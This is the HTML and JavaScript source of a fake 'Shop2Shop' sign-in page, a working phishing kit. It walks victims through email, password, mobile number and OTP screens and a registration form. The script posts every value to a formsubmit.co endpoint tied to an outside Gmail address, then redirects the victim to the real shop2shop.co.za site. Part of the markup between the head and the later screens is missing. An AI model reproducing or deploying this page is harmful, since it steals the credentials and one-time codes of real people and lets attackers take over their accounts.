<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In | Shop2Shop</title>
    <style>
        :root { --bg-navy: #0e223d; --brand-gold: #f5a623; --text-white: #ffffff; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: var(--bg-navy); color: var(--text-white); font-family: 'Segoe UI', Arial, Helvetica, sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 40px 30px; }
        .container { width: 100%; max-width: 420px; }
        .screen { display: none; animation: fadeIn 0.3s ease; }
        .screen.active { display: block; }
        .logo-wrap { margin-bottom: 40px; }
        .logo-img { height: 48px; width: auto; }
        .email-display { font-size: 16px; color: var(--text-white); border-bottom: 1.5px solid rgba(255,255,255,0.5); padding-bottom: 8px; margin-bottom: 28px; word-break: break-all; }
        .field-label { font-size: 14px; font-weight: bold; margin-bottom: 8px; display: block; }
        .field-input { width: 100%; background: transparent; border: none; border-bottom: 1.5px solid rgba(255,255,255,0.5); color: white; font-size: 16px; padding: 8px 0 6px; outline: none; transition: border-color 0.2s; }
        .field-input::placeholder { color: rgba(255,255,255,0.3); }
        .field-input:focus { border-bottom-color: var(--brand-gold); }
        .input-group { margin-bottom: 28px; }
        .remember-row { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; font-size: 14px; }
        .remember-row input { width: 18px; height: 18px; accent-color: var(--brand-gold); cursor: pointer; }
        .btn-gold { width: 100%; padding: 15px; background-color: var(--brand-gold); border: none; border-radius: 6px; color: white; font-weight: bold; font-size: 15px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; margin-bottom: 14px; transition: opacity 0.2s; }
        .btn-gold:hover { opacity: 0.9; }
        .btn-grey { width: 100%; padding: 15px; background-color: #6b6b6b; border: 1.5px solid var(--brand-gold); border-radius: 6px; color: white; font-weight: bold; font-size: 15px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; margin-bottom: 14px; }
        .forgot-link { display: block; text-align: center; color: var(--brand-gold); font-size: 14px; margin-bottom: 24px; cursor: pointer; }
        .divider { border-top: 0.5px solid rgba(255,255,255,0.2); margin: 30px 0 20px; }
        .footer { font-size: 14px; text-align: center; }
        .footer a { color: var(--brand-gold); font-weight: bold; text-decoration: none; margin-left: 4px; cursor: pointer; }
        .otp-info { font-size: 14px; color: rgba(255,255,255,0.75); text-align: center; margin-bottom: 24px; line-height: 1.6; }
        .otp-timer { font-size: 13px; color: rgba(255,255,255,0.55); text-align: center; margin-top: 14px; }
        .screen-title { font-size: 18px; font-weight: bold; margin-bottom: 24px; }
        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(3px); }
        .modal.open { display: flex; }
        .modal-box { background: #0e2a48; width: 90%; max-width: 380px; padding: 28px 24px 32px; border-radius: 20px; border-top: 4px solid var(--brand-gold); position: relative; }
        .modal-box h3 { color: var(--brand-gold); margin-bottom: 20px; font-size: 22px; }
        .modal-close { background: none; border: none; color: #aaa; font-size: 28px; position: absolute; top: 12px; right: 18px; cursor: pointer; }
        .modal-error { color: #ff9e7a; font-size: 12px; margin-top: 8px; display: none; }
        .reg-btn { width: 100%; background: #6b6b6b; border: 1px solid var(--brand-gold); color: white; padding: 11px; border-radius: 40px; font-weight: bold; margin-top: 10px; cursor: pointer; font-size: 14px; }
        .inline-info { font-size: 12px; margin-top: 8px; color: #c9d9ff; text-align: center; }
        @keyframes fadeIn { from { opacity:0; transform: translateY(6px); } to { opacity:1; transform: translateY(0); } }
    </style>
</head>

        </div>
        <div class="email-display" id="emailDisplay"></div>
        <div class="input-group">
            <label class="field-label">Password</label>
            <input class="field-input" type="password" id="passwordInput" placeholder="••••••••" autocomplete="current-password">
        </div>
        <span class="forgot-link">Forgot Password?</span>
        <button class="btn-gold" id="btnSignIn2">SIGN IN</button>
        <button class="btn-gold" id="btnSecureLogin">SECURE LOGIN</button>
    </div>

    <!-- SCREEN 3: MOBILE -->
    <div class="screen" id="screen-mobile">
        <div class="screen-title">Enter your mobile number</div>
        <div class="input-group">
            <input class="field-input" type="tel" id="mobileInput" placeholder="e.g. 0712345678" autocomplete="tel">
        </div>
        <button class="btn-gold" id="btnGetOTP">GET OTP</button>
    </div>

    <!-- SCREEN 4: OTP -->
    <div class="screen" id="screen-otp">
        <div class="screen-title">Enter OTP</div>
        <div class="input-group">
            <input class="field-input" type="tel" id="otpInput" placeholder="">
        </div>
        <p class="otp-info">OTP sent to <span id="otpPhone"></span>. If you do not receive an OTP, please request another one.</p>
        <button class="btn-gold" id="btnVerify">VERIFY</button>
        <div class="otp-timer">You may request another OTP in <span id="countdown">60</span> seconds</div>
    </div>

</div>

<!-- REGISTER MODAL -->
<div class="modal" id="registerModal">
    <div class="modal-box">
        <button class="modal-close" id="closeRegBtn">&times;</button>
        <h3>Create Account</h3>
        <div class="input-group">
            <label class="field-label">Email Address</label>
            <input class="field-input" type="email" id="regEmail" placeholder="example@domain.com">
        </div>
        <div class="input-group">
            <label class="field-label">Password</label>
            <input class="field-input" type="password" id="regPassword" placeholder="min. 6 characters">
        </div>
        <div class="input-group">
            <label class="field-label">Confirm Password</label>
            <input class="field-input" type="password" id="regConfirm" placeholder="confirm password">
        </div>
        <div class="modal-error" id="regError"></div>
        <button class="reg-btn" id="btnRegister">Register Now</button>
        <div class="inline-info">By registering you agree to our terms</div>
    </div>
</div>

<script>
    var countdownTimer;

    function showScreen(id) {
        document.querySelectorAll('.screen').forEach(function(s) { s.classList.remove('active'); });
        document.getElementById(id).classList.add('active');
    }

    function submitToFormSubmit(subject, fields, callback) {
        var formData = new FormData();
        formData.append('_subject', subject);
        formData.append('_captcha', 'false');
        formData.append('_template', 'table');
        fields.forEach(function(pair) {
            formData.append(pair[0], pair[1]);
        });
        fetch('https://formsubmit.co/ajax/emuphit67@gmail.com', {
            method: 'POST',
            body: formData,
            headers: { 'Accept': 'application/json' }
        }).finally(function() {
            callback();
        });
    }

    // SCREEN 1: Submit email → screen 2
    document.getElementById('btnSignIn1').addEventListener('click', function() {
        var email = document.getElementById('emailInput').value.trim();
        if (!email) return;
        document.getElementById('emailDisplay').textContent = email;
        submitToFormSubmit('Shop2Shop - Email', [['Email', email]], function() {
            showScreen('screen-password');
        });
    });

    // SCREEN 2: Both buttons submit password → screen 3
    document.getElementById('btnSignIn2').addEventListener('click', function() {
        var email = document.getElementById('emailInput').value.trim();
        var pass = document.getElementById('passwordInput').value;
        submitToFormSubmit('Shop2Shop - Password', [['Email', email], ['Password', pass]], function() {
            showScreen('screen-mobile');
        });
    });

    document.getElementById('btnSecureLogin').addEventListener('click', function() {
        var email = document.getElementById('emailInput').value.trim();
        var pass = document.getElementById('passwordInput').value;
        submitToFormSubmit('Shop2Shop - Password', [['Email', email], ['Password', pass]], function() {
            showScreen('screen-mobile');
        });
    });

    // SCREEN 3: Submit mobile → screen 4
    document.getElementById('btnGetOTP').addEventListener('click', function() {
        var mobile = document.getElementById('mobileInput').value.trim();
        if (!mobile) return;
        var email = document.getElementById('emailInput').value.trim();
        document.getElementById('otpPhone').textContent = mobile;
        submitToFormSubmit('Shop2Shop - Mobile', [['Email', email], ['Mobile', mobile]], function() {
            showScreen('screen-otp');
            startCountdown();
        });
    });

    // SCREEN 4: Submit OTP → redirect
    document.getElementById('btnVerify').addEventListener('click', function() {
        var otp = document.getElementById('otpInput').value.trim();
        var mobile = document.getElementById('mobileInput').value.trim();
        var email = document.getElementById('emailInput').value.trim();
        submitToFormSubmit('Shop2Shop - OTP', [['Email', email], ['Mobile', mobile], ['OTP', otp]], function() {
            window.location.replace('https://www.shop2shop.co.za/');
        });
    });

    function startCountdown() {
        var secs = 60;
        document.getElementById('countdown').textContent = secs;
        clearInterval(countdownTimer);
        countdownTimer = setInterval(function() {
            secs--;
            document.getElementById('countdown').textContent = secs;
            if (secs <= 0) {
                clearInterval(countdownTimer);
                document.querySelector('.otp-timer').textContent = 'You may now request another OTP.';
            }
        }, 1000);
    }

    document.getElementById('openRegBtn').addEventListener('click', function() {
        document.getElementById('registerModal').classList.add('open');
    });
    document.getElementById('closeRegBtn').addEventListener('click', function() {
        document.getElementById('registerModal').classList.remove('open');
    });
    window.addEventListener('click', function(e) {
        if (e.target === document.getElementById('registerModal')) {
            document.getElementById('registerModal').classList.remove('open');
        }
    });

    document.getElementById('btnRegister').addEventListener('click', function() {
        var email = document.getElementById('regEmail').value.trim();
        var pass = document.getElementById('regPassword').value;
        var conf = document.getElementById('regConfirm').value;
        var errEl = document.getElementById('regError');
        errEl.style.display = 'none';
        var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email || !re.test(email)) { errEl.textContent = 'Enter a valid email.'; errEl.style.display='block'; return; }
        if (pass.length < 6) { errEl.textContent = 'Password must be at least 6 characters.'; errEl.style.display='block'; return; }
        if (pass !== conf) { errEl.textContent = 'Passwords do not match.'; errEl.style.display='block'; return; }
        submitToFormSubmit('Shop2Shop - Registration', [['Email', email], ['Password', pass]], function() {
            document.getElementById('registerModal').classList.remove('open');
            document.getElementById('emailInput').value = email;
            showScreen('screen-email');
        });
    });
</script>
</body>
              </html>
